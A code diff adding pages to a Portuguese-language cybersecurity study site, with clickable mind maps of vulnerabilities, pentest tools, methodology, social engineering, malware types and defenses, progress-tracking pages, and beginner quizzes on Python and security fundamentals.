+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('a04')">SSRF</span><span class="mm-note">— servidor faz requests</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('a05')">Path Traversal</span><span class="mm-note">— ../ fora do dir</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('a07')">IDOR</span><span class="mm-note">— trocar ID</span></div>
+<div class="mm-line"><span class="mm-pipe">└─ </span><span class="mm-cat">Sessão & UI</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('a08')">Open Redirect</span><span class="mm-note">— redirect malicioso</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('a09')">Clickjacking</span><span class="mm-note">— iframe invisível</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('a10')">Session Hijacking</span><span class="mm-note">— roubar token</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('a11')">Auth Bypass</span><span class="mm-note">— pular login</span></div>
+<div class="mm-line"><span class="mm-pipe">   └─ </span><span class="mm-leaf gloss" onclick="go('a12')">Race Condition</span><span class="mm-note">— colisão temporal</span></div>
+</div>
+<div class="mm-legend">
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p500)"></span>Categoria</span>
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p300)"></span>Termo (clique pra abrir)</span>
+</div>
+</div>
+
+<!-- MIND MAP: Pentest Tools Mind Map -->
+<div class="pg" id="pg-mm-b7">
+<div class="ph">
+<div class="bc">cherry root <span>›</span> mind maps <span>›</span> Block 7</div>
+<div class="pt">Pentest Tools Mind Map</div>
+<div class="ps">As ferramentas do arsenal organizadas por uso.</div>
+</div>
+<div class="mm-stats">
+<span class="mm-stat-chip">12 termos</span>
+<span class="mm-stat-chip">clicáveis</span>
+<span class="mm-stat-chip">com glossário</span>
+</div>
+<div class="mm-intro">
+<div class="mm-intro-label">mapa mental</div>
+Visualize como os termos se conectam. Clique em qualquer termo pra ir direto pra página dele.
+</div>
+<div class="mm-tree">
+<div class="mm-root">Pentest Tools — Block 7</div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Recon & Scan</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('t01')">nmap</span><span class="mm-note">— port scanner</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('t06')">Gobuster / Dirb</span><span class="mm-note">— brute dirs</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('t03')">Wireshark</span><span class="mm-note">— sniff packets</span></div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Web Testing</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('t02')">Burp Suite</span><span class="mm-note">— proxy HTTP</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('t05')">sqlmap</span><span class="mm-note">— SQLi auto</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('t11')">curl</span><span class="mm-note">— HTTP CLI</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('t12')">Browser DevTools</span><span class="mm-note">— inspect tudo</span></div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Exploitation</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('t04')">Metasploit</span><span class="mm-note">— framework</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('t10')">netcat</span><span class="mm-note">— canivete</span></div>
+<div class="mm-line"><span class="mm-pipe">└─ </span><span class="mm-cat">Cracking</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('t07')">John the Ripper</span><span class="mm-note">— hashes CPU</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('t08')">Hashcat</span><span class="mm-note">— hashes GPU</span></div>
+<div class="mm-line"><span class="mm-pipe">   └─ </span><span class="mm-leaf gloss" onclick="go('t09')">Hydra</span><span class="mm-note">— brute login</span></div>
+</div>
+<div class="mm-legend">
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p500)"></span>Categoria</span>
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p300)"></span>Termo (clique pra abrir)</span>
+</div>
+</div>
+
+<!-- MIND MAP: Methodology Mind Map -->
+<div class="pg" id="pg-mm-b8">
+<div class="ph">
+<div class="bc">cherry root <span>›</span> mind maps <span>›</span> Block 8</div>
+<div class="pt">Methodology Mind Map</div>
+<div class="ps">As fases de um pentest em ordem.</div>
+</div>
+<div class="mm-stats">
+<span class="mm-stat-chip">10 termos</span>
+<span class="mm-stat-chip">clicáveis</span>
+<span class="mm-stat-chip">com glossário</span>
+</div>
+<div class="mm-intro">
+<div class="mm-intro-label">mapa mental</div>
+Visualize como os termos se conectam. Clique em qualquer termo pra ir direto pra página dele.
+</div>
+<div class="mm-tree">
+<div class="mm-root">Pentest Methodology — Block 8</div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Discovery</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('m01')">Reconnaissance</span><span class="mm-note">— intel passiva/ativa</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('m02')">Scanning</span><span class="mm-note">— portas e serviços</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('m03')">Enumeration</span><span class="mm-note">— users, shares, banners</span></div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Breach</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('m04')">Exploitation</span><span class="mm-note">— ganhar acesso</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('m05')">Privilege Escalation</span><span class="mm-note">— virar root/SYSTEM</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('m06')">Persistence</span><span class="mm-note">— manter acesso</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('m07')">Lateral Movement</span><span class="mm-note">— pivot</span></div>
+<div class="mm-line"><span class="mm-pipe">└─ </span><span class="mm-cat">Close-out</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('m08')">Exfiltration</span><span class="mm-note">— extrair dados</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('m09')">Covering Tracks</span><span class="mm-note">— limpar logs</span></div>
+<div class="mm-line"><span class="mm-pipe">   └─ </span><span class="mm-leaf gloss" onclick="go('m10')">Reporting</span><span class="mm-note">— produto final</span></div>
+</div>
+<div class="mm-legend">
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p500)"></span>Categoria</span>
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p300)"></span>Termo (clique pra abrir)</span>
+</div>
+</div>
+
+<!-- MIND MAP: Social Engineering Mind Map -->
+<div class="pg" id="pg-mm-b9">
+<div class="ph">
+<div class="bc">cherry root <span>›</span> mind maps <span>›</span> Block 9</div>
+<div class="pt">Social Engineering Mind Map</div>
+<div class="ps">Como atacar pelo elemento humano.</div>
+</div>
+<div class="mm-stats">
+<span class="mm-stat-chip">10 termos</span>
+<span class="mm-stat-chip">clicáveis</span>
+<span class="mm-stat-chip">com glossário</span>
+</div>
+<div class="mm-intro">
+<div class="mm-intro-label">mapa mental</div>
+Visualize como os termos se conectam. Clique em qualquer termo pra ir direto pra página dele.
+</div>
+<div class="mm-tree">
+<div class="mm-root">Social Engineering — Block 9</div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Digital</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('e01')">Phishing</span><span class="mm-note">— email em massa</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('e02')">Spear Phishing</span><span class="mm-note">— alvo único</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('e07')">Smishing</span><span class="mm-note">— phishing por SMS</span></div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Voice & Physical</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('e06')">Vishing</span><span class="mm-note">— telefone</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('e05')">Tailgating</span><span class="mm-note">— entrar atrás</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('e04')">Baiting</span><span class="mm-note">— USB drop, isca</span></div>
+<div class="mm-line"><span class="mm-pipe">└─ </span><span class="mm-cat">Pretexting</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('e03')">Pretexting</span><span class="mm-note">— cenário falso</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('e08')">Watering Hole</span><span class="mm-note">— sites que vítima visita</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('e09')">Quid Pro Quo</span><span class="mm-note">— troca por info</span></div>
+<div class="mm-line"><span class="mm-pipe">   └─ </span><span class="mm-leaf gloss" onclick="go('e10')">Impersonation</span><span class="mm-note">— fingir autoridade</span></div>
+</div>
+<div class="mm-legend">
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p500)"></span>Categoria</span>
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p300)"></span>Termo (clique pra abrir)</span>
+</div>
+</div>
+
+<!-- MIND MAP: Malware Mind Map -->
+<div class="pg" id="pg-mm-b10">
+<div class="ph">
+<div class="bc">cherry root <span>›</span> mind maps <span>›</span> Block 10</div>
+<div class="pt">Malware Mind Map</div>
+<div class="ps">Os tipos de malware agrupados por comportamento.</div>
+</div>
+<div class="mm-stats">
+<span class="mm-stat-chip">10 termos</span>
+<span class="mm-stat-chip">clicáveis</span>
+<span class="mm-stat-chip">com glossário</span>
+</div>
+<div class="mm-intro">
+<div class="mm-intro-label">mapa mental</div>
+Visualize como os termos se conectam. Clique em qualquer termo pra ir direto pra página dele.
+</div>
+<div class="mm-tree">
+<div class="mm-root">Malware — Block 10</div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Replicação</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('x01')">Virus</span><span class="mm-note">— infecta hosts</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('x02')">Worm</span><span class="mm-note">— self-propaga</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('x09')">Botnet</span><span class="mm-note">— rede de zumbis</span></div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Stealth</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('x03')">Trojan</span><span class="mm-note">— disfarçado</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('x06')">Rootkit</span><span class="mm-note">— kernel level</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('x08')">Backdoor</span><span class="mm-note">— porta dos fundos</span></div>
+<div class="mm-line"><span class="mm-pipe">└─ </span><span class="mm-cat">Payload</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('x04')">Ransomware</span><span class="mm-note">— criptografa + resgate</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('x05')">Spyware</span><span class="mm-note">— espiona</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('x07')">Keylogger</span><span class="mm-note">— captura teclas</span></div>
+<div class="mm-line"><span class="mm-pipe">   └─ </span><span class="mm-leaf gloss" onclick="go('x10')">Logic Bomb</span><span class="mm-note">— gatilho condicional</span></div>
+</div>
+<div class="mm-legend">
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p500)"></span>Categoria</span>
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p300)"></span>Termo (clique pra abrir)</span>
+</div>
+</div>
+
+<!-- MIND MAP: Defense Mind Map -->
+<div class="pg" id="pg-mm-b11">
+<div class="ph">
+<div class="bc">cherry root <span>›</span> mind maps <span>›</span> Block 11</div>
+<div class="pt">Defense Mind Map</div>
+<div class="ps">A blue team em camadas: prevenir, detectar, responder.</div>
+</div>
+<div class="mm-stats">
+<span class="mm-stat-chip">10 termos</span>
+<span class="mm-stat-chip">clicáveis</span>
+<span class="mm-stat-chip">com glossário</span>
+</div>
+<div class="mm-intro">
+<div class="mm-intro-label">mapa mental</div>
+Visualize como os termos se conectam. Clique em qualquer termo pra ir direto pra página dele.
+</div>
+<div class="mm-tree">
+<div class="mm-root">Defense — Block 11</div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Perímetro</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('d01')">Firewall</span><span class="mm-note">— L3/L4</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('d05')">WAF</span><span class="mm-note">— L7</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('d02')">IDS / IPS</span><span class="mm-note">— detect/block</span></div>
+<div class="mm-line"><span class="mm-pipe">├─ </span><span class="mm-cat">Detecção</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('d03')">SIEM</span><span class="mm-note">— logs centralizados</span></div>
+<div class="mm-line"><span class="mm-pipe">│  ├─ </span><span class="mm-leaf gloss" onclick="go('d04')">EDR</span><span class="mm-note">— endpoint</span></div>
+<div class="mm-line"><span class="mm-pipe">│  └─ </span><span class="mm-leaf gloss" onclick="go('d06')">Honeypot</span><span class="mm-note">— iscas</span></div>
+<div class="mm-line"><span class="mm-pipe">└─ </span><span class="mm-cat">Resiliência</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('d07')">Patch Management</span><span class="mm-note">— atualizar</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('d08')">Backup Strategy</span><span class="mm-note">— 3-2-1</span></div>
+<div class="mm-line"><span class="mm-pipe">   ├─ </span><span class="mm-leaf gloss" onclick="go('d09')">Incident Response</span><span class="mm-note">— PICERL</span></div>
+<div class="mm-line"><span class="mm-pipe">   └─ </span><span class="mm-leaf gloss" onclick="go('d10')">Security Awareness</span><span class="mm-note">— human firewall</span></div>
+</div>
+<div class="mm-legend">
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p500)"></span>Categoria</span>
+<span class="mm-legend-item"><span class="mm-legend-dot" style="background:var(--p300)"></span>Termo (clique pra abrir)</span>
+</div>
 </div>
 
 
@@ -4601,6 +4997,103 @@ Visualize como os termos se conectam. Clique em qualquer termo pra ir direto pra
 </div></div>
 
 
+<!-- ============ GOALS & PROGRESS ============ -->
+<div class="pg" id="pg-goals">
+<div class="ph">
+<div class="bc">cherry root <span>&rsaquo;</span> goals</div>
+<div class="pt">Goals &amp; Progress</div>
+<div class="ps">Define your learning objectives. Track what matters. Celebrate small wins.</div>
+</div>
+
+<div class="sec">
+<div class="sl">&#9312; Counter</div>
+<div class="goals-counter" id="goalsCounter" style="background:var(--p50);border:1.5px solid var(--p200);border-radius:14px;padding:1.1rem 1.3rem;font-family:'Playfair Display',serif;font-size:1.3rem;font-weight:700;color:var(--ink);text-align:center">0 / 0 goals completed</div>
+</div>
+
+<div class="sec">
+<div class="sl">&#9313; Add a goal</div>
+<div style="display:flex;gap:.5rem;flex-wrap:wrap">
+<input id="goalInput" type="text" placeholder="e.g. Read 1 term every day" style="flex:1;min-width:200px;font-family:'DM Sans',sans-serif;font-size:.86rem;padding:.6rem .85rem;border:1.5px solid var(--p200);border-radius:10px;background:white;color:var(--ink);outline:none" onkeydown="if(event.key==='Enter')addGoal()">
+<button onclick="addGoal()" style="font-family:'DM Mono',monospace;font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;background:var(--p500);color:white;border:none;border-radius:10px;padding:.6rem 1.1rem;cursor:pointer">+ Add</button>
+</div>
+</div>
+
+<div class="sec">
+<div class="sl">&#9314; Suggested goals</div>
+<div id="goalSuggestions" style="display:flex;flex-wrap:wrap;gap:.4rem"></div>
+</div>
+
+<div class="sec">
+<div class="sl">&#9315; Your goals</div>
+<div id="goalsList"></div>
+</div>
+</div>
+
+<!-- ============ STATISTICS ============ -->
+<div class="pg" id="pg-stats">
+<div class="ph">
+<div class="bc">cherry root <span>&rsaquo;</span> statistics</div>
+<div class="pt">Statistics Dashboard</div>
+<div class="ps">A snapshot of everything you have tagged, studied, written, and quizzed.</div>
+</div>
+
+<div class="sec">
+<div class="sl">&#9312; Overview</div>
+<div id="statsGrid" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(150px,1fr));gap:.7rem"></div>
+</div>
+
+<div class="sec">
+<div class="sl">&#9313; Quizzes</div>
+<div id="statsQuizzes" style="background:white;border:1.5px solid var(--line);border-radius:14px;padding:1.1rem 1.3rem"></div>
+</div>
+
+<div class="sec">
+<div class="sl">&#9314; Blocks</div>
+<div id="statsBlocks" style="background:white;border:1.5px solid var(--line);border-radius:14px;padding:1.1rem 1.3rem"></div>
+</div>
+
+<div class="sec">
+<div class="sl">&#9315; Study streak</div>
+<div id="statsStreak" style="background:var(--p50);border:1.5px solid var(--p200);border-radius:14px;padding:1.1rem 1.3rem;font-family:'Playfair Display',serif;font-size:1.05rem;color:var(--ink);text-align:center">0 days</div>
+</div>
+</div>
+
+<!-- ============ PROGRESS MANAGEMENT ============ -->
+<div class="pg" id="pg-progress-management">
+<div class="ph">
+<div class="bc">cherry root <span>&rsaquo;</span> progress</div>
+<div class="pt">Manage Progress</div>
+<div class="ps">Export your progress to a file, import it on another device, or wipe everything and start fresh.</div>
+</div>
+
+<div class="sec">
+<div class="sl">&#9312; Export</div>
+<div style="background:white;border:1.5px solid var(--line);border-radius:14px;padding:1.1rem 1.3rem">
+<p style="font-size:.84rem;line-height:1.65;color:var(--ink2);margin-bottom:.7rem">Download all your tags, notes, goals and quiz scores as a single <code>.cherry.json</code> file.</p>
+<button onclick="exportProgress()" style="font-family:'DM Mono',monospace;font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;background:var(--p500);color:white;border:none;border-radius:10px;padding:.6rem 1.1rem;cursor:pointer">Download backup</button>
+</div>
+</div>
+
+<div class="sec">
+<div class="sl">&#9313; Import</div>
+<div style="background:white;border:1.5px solid var(--line);border-radius:14px;padding:1.1rem 1.3rem">
+<p style="font-size:.84rem;line-height:1.65;color:var(--ink2);margin-bottom:.7rem">Restore progress from a previously exported file. You will be asked to confirm before anything is written.</p>
+<input type="file" id="importFileInput" accept=".json,.cherry.json,application/json" style="display:none" onchange="importProgress(this.files[0])">
+<button onclick="document.getElementById('importFileInput').click()" style="font-family:'DM Mono',monospace;font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;background:var(--ink);color:white;border:none;border-radius:10px;padding:.6rem 1.1rem;cursor:pointer">Choose file</button>
+<div id="importStatus" style="margin-top:.7rem;font-size:.78rem;color:var(--ink3)"></div>
+</div>
+</div>
+
+<div class="sec">
+<div class="sl">&#9314; Reset</div>
+<div style="background:#fff5f7;border:1.5px solid var(--p300);border-radius:14px;padding:1.1rem 1.3rem">
+<p style="font-size:.84rem;line-height:1.65;color:var(--ink2);margin-bottom:.7rem"><strong>Danger zone.</strong> This will permanently delete all your tags, notes, goals, and quiz scores from this browser.</p>
+<button onclick="resetProgress()" style="font-family:'DM Mono',monospace;font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;background:var(--p500);color:white;border:none;border-radius:10px;padding:.6rem 1.1rem;cursor:pointer">Reset everything</button>
+</div>
+</div>
+</div>
+
+
 </main>
 <script>
 function go(id,el){
@@ -5339,6 +5832,223 @@ const QUIZ_B3_PRACTICE = [
 ];
 
 
+// ============ BLOCK 4 · PROGRAMMING BASICS ============
+const QUIZ_B4_THEORY = [
+  {q:"O que faz uma variável?",a:["Executa código","Armazena um valor sob um nome","É um tipo de loop","Conecta à internet"],correct:1,expl:"Variável = nome que aponta pra um valor na memória. Permite reutilizar e modificar dados."},
+  {q:"Qual a diferença entre lista e dicionário em Python?",a:["São iguais","Lista é ordenada por índice, dict mapeia chave→valor","Dict é mais rápido sempre","Lista não permite alterar"],correct:1,expl:"Lista: [1,2,3] acessada por índice. Dict: {'a':1} acessada por chave. Estruturas diferentes pra usos diferentes."},
+  {q:"O que é um loop infinito?",a:["Loop que executa 1 vez","Loop cuja condição nunca se torna falsa","Função recursiva","Erro de sintaxe"],correct:1,expl:"while True sem break é loop infinito. Útil pra daemons, perigoso por acidente — trava o programa."},
+  {q:"O que `if` avalia?",a:["Sempre True","Uma expressão booleana (True/False)","O tipo da variável","O tamanho da string"],correct:1,expl:"if avalia se a expressão é truthy. Em Python, 0, '', [], None, False são falsy; resto é truthy."},
+  {q:"Qual o propósito de uma função?",a:["Decorar código","Encapsular código reutilizável com entrada/saída","Apenas comentário","Tipo de variável"],correct:1,expl:"Função empacota lógica reutilizável. Recebe args, retorna valor. Reduz duplicação e melhora legibilidade."},
+  {q:"O que é string interpolation?",a:["Concatenar strings com +","Inserir valores dentro de string (ex: f-string)","Quebrar string em letras","Encriptar string"],correct:1,expl:"Em Python: f'Olá {nome}' insere valor da variável. Outras linguagens: template literals, printf, etc."},
+  {q:"O que retorna uma função sem return explícito em Python?",a:["0","None","''","Erro"],correct:1,expl:"Toda função Python retorna algo. Sem return explícito, retorna None implicitamente."},
+  {q:"O que é I/O de arquivo?",a:["Input/Output — ler e escrever arquivos","Tipo de variável","Erro de programa","Modo gráfico"],correct:0,expl:"I/O = Input/Output. Operações de leitura/escrita em disco, rede, terminal. Sempre mais lento que RAM."},
+  {q:"Por que Python é popular entre hackers?",a:["É a única opção","Sintaxe simples, ricas libs (requests, scapy, pwntools), portável","É mais rápido que C","Só roda em Kali"],correct:1,expl:"Python combina rapidez de desenvolvimento, libs maduras pra rede/crypto/web, e ubiquidade — ideal pra scripts ofensivos."},
+  {q:"O que é lógica de programação?",a:["Tipo de linguagem","Forma de estruturar passos pra resolver um problema","Sintaxe de uma linguagem","Tipo de variável"],correct:1,expl:"Lógica de programação = decompor problema em passos sequenciais (condições, loops, dados) independente de linguagem."}
+];
+
+const QUIZ_B4_PRACTICE = [
+  {q:"Você vê `x = 'hello'; print(x[1])`. O que imprime?",a:["'h'","'e'","'hello'","Erro"],correct:1,expl:"Strings são indexadas a partir de 0. x[0]='h', x[1]='e'. Indexação igual a listas."},
+  {q:"Como ler um arquivo linha-a-linha em Python idiomaticamente?",a:["read() inteiro","for line in open('f'):","getline()","scan()"],correct:1,expl:"`for line in open(...)` (ou with open(...) as f:) itera linhas sem carregar tudo na RAM."},
+  {q:"Qual o resultado de `5 / 2` em Python 3?",a:["2","2.5","2.0","Erro"],correct:1,expl:"Python 3 / sempre faz divisão float. Pra divisão inteira use //. 5//2 = 2."},
+  {q:"Qual loop garante pelo menos uma execução?",a:["for","while","do-while (não existe em Python puro)","if"],correct:2,expl:"do-while checa condição depois — sempre roda 1x. Python não tem nativo (simule com while True + break)."},
+  {q:"Como checar se 'cat' está na lista `pets`?",a:["pets.has('cat')","'cat' in pets","pets.find('cat')","contains(pets, 'cat')"],correct:1,expl:"`'cat' in pets` é a forma Pythônica. Funciona pra listas, sets, strings, dict (procura chave)."},
+  {q:"O que `len('abc')` retorna?",a:["2","3","4","'abc'"],correct:1,expl:"len() retorna número de elementos. String 'abc' tem 3 chars. Funciona em str, list, dict, tuple, set."},
+  {q:"Como inverter uma lista `xs`?",a:["xs.invert()","xs[::-1] ou reversed(xs)","-xs","xs.flip()"],correct:1,expl:"Slice xs[::-1] cria nova lista invertida. reversed(xs) retorna iterador. xs.reverse() inverte in-place."},
+  {q:"O que está errado em `if x = 5:`?",a:["Nada","= é atribuição; comparação é ==","Falta else","Falta dois pontos"],correct:1,expl:"= atribui valor, == compara. Em Python `if x = 5` é erro de sintaxe. Em C é bug silencioso comum."},
+  {q:"Como tratar chave faltante em dict de forma segura?",a:["d['k']","d.get('k') ou d.get('k', default)","d.find('k')","d[k] or 0"],correct:1,expl:".get() retorna None (ou default) se chave não existe — evita KeyError. d['k'] crasha sem tratar."},
+  {q:"Diferença entre `==` e `is` em Python?",a:["Iguais","== compara valor; is compara identidade (mesmo objeto na memória)","is é mais rápido sempre","== só pra números"],correct:1,expl:"a == b: valores iguais? a is b: mesmo objeto? Use is só pra None/True/False/singletons."}
+];
+
+// ============ BLOCK 5 · SECURITY FUNDAMENTALS ============
+const QUIZ_B5_THEORY = [
+  {q:"O que é o Tríade CIA em segurança?",a:["CPU, Internet, Antivirus","Confidentiality, Integrity, Availability","Crypto, IP, Auth","Confidential, Internal, Audit"],correct:1,expl:"CIA = Confidencialidade (só quem deve vê), Integridade (não foi alterado), Disponibilidade (acessível quando precisa)."},
+  {q:"Diferença entre ameaça, vulnerabilidade e risco?",a:["São sinônimos","Ameaça = atacante; Vulnerabilidade = falha; Risco = probabilidade × impacto","Risco = ameaça","Vulnerabilidade é só software"],correct:1,expl:"Threat: agente/evento. Vulnerability: fraqueza explorável. Risk: combinação de prob. e impacto."},
+  {q:"O que é attack surface?",a:["Tela do computador","Conjunto de todos os pontos onde um atacante pode tentar entrar","Tipo de antivírus","IP público"],correct:1,expl:"Attack surface = portas abertas, endpoints, usuários, APIs, libs. Reduzir = principal defesa preventiva."},
+  {q:"O que é defesa em profundidade?",a:["Apenas um firewall potente","Múltiplas camadas de defesa — se uma falha, outra protege","Antivírus pago","Senha forte"],correct:1,expl:"Defense in Depth: firewall + IDS + EDR + WAF + treinamento + backup. Atacante precisa derrotar várias camadas."},
+  {q:"O que é Zero Trust?",a:["Confiar em todos","Nunca confiar, sempre verificar — mesmo dentro da rede","Não usar senhas","Bloquear tudo"],correct:1,expl:"Zero Trust: 'never trust, always verify'. Nada é confiável por estar na 'rede interna' — autentique sempre."},
+  {q:"Diferença entre criptografia e hashing?",a:["São iguais","Criptografia é reversível com chave; hash é one-way","Hash é mais seguro","Criptografia não usa chave"],correct:1,expl:"Crypto: encrypt + decrypt (com chave). Hash: irreversível, usado pra senhas, integridade. Não confunda!"},
+  {q:"Diferença entre autenticação e autorização?",a:["São iguais","AuthN: quem é você? AuthZ: o que pode fazer?","AuthZ vem antes","Só uma é necessária"],correct:1,expl:"Autenticação prova identidade (senha, token). Autorização decide permissões. AuthN → AuthZ, sempre."},
+  {q:"O que é princípio do menor privilégio?",a:["Dar root pra todos","Conceder só o mínimo necessário pra cada função","Usar senha fraca","Bloquear tudo"],correct:1,expl:"Least Privilege: usuário/serviço recebe só permissões mínimas. Reduz impacto de comprometimento."},
+  {q:"O que é MFA?",a:["Many File Access","Multi-Factor Authentication — algo que sabe + algo que tem/é","Modo Falha Ativa","Master File Audit"],correct:1,expl:"MFA combina fatores: senha (sabe) + token/SMS (tem) + biometria (é). Mata maioria de credential stuffing."},
+  {q:"O que é um CVE?",a:["Tipo de vírus","Identificador padronizado de uma vulnerabilidade conhecida","Empresa de segurança","Antivírus"],correct:1,expl:"CVE = Common Vulnerabilities and Exposures. Ex: CVE-2021-44228 (Log4Shell). Catálogo público de vulns."}
+];
+
+const QUIZ_B5_PRACTICE = [
+  {q:"Atacante rouba arquivo de hashes bcrypt. Quão exposto está?",a:["Imediatamente exposto","Razoavelmente seguro — bcrypt é lento, brute-force custoso","Sem risco","Idêntico a MD5"],correct:1,expl:"bcrypt usa salt + custo configurável. Quebrar senha forte é caro. Mas senhas fracas ainda caem — force reset!"},
+  {q:"Dados criptografados em trânsito mas não em rest. Qual o risco?",a:["Nenhum","Quem comprometer servidor/disco lê tudo em cleartext","Mais lento","Backup quebra"],correct:1,expl:"Cobertura parcial: encrypt-at-rest protege contra roubo de disco/backup/DBA malicioso."},
+  {q:"App tem login simples mas roda como root. Qual o problema?",a:["Nenhum","Viola menor privilégio — RCE = root automático","Mais rápido","Mais seguro"],correct:1,expl:"App web nunca deveria rodar como root. Use user dedicado com permissões mínimas."},
